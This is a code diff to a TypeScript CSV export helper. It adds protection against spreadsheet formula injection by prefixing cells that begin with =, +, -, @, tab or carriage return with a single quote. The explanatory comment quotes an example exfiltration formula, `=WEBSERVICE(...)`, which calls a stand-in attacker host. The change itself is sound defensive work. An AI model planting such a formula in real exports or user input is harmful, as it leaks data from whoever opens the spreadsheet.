@@ -15,12 +15,24 @@ export interface ExportColumn {
 /**
  * Escape a single CSV cell value per RFC 4180:
  *  - convert to string
+ *  - neutralize spreadsheet formula injection
  *  - wrap in double-quotes
  *  - double-up any internal double-quotes
+ *
+ * CSV formula injection: a cell beginning with = + - @ (or a tab / carriage
+ * return) is evaluated as a formula by Excel/Sheets when the export is opened,
+ * even inside quotes. Export rows here contain user-controlled strings (buyer
+ * names, custom product names, coupon codes), so an entry like
+ * `=WEBSERVICE("http://attacker/?"&A1)` would exfiltrate data the moment an
+ * admin opens the file. Prefix any such value with a single quote so the
+ * spreadsheet treats it as literal text.
  */
 function escapeCSVCell(value: unknown): string {
   if (value === null || value === undefined) return '""';
-  const str = String(value);
+  let str = String(value);
+  if (/^[=+\-@\t\r]/.test(str)) {
+    str = `'${str}`;
+  }
   return `"${str.replace(/"/g, '""')}"`;
 }
 
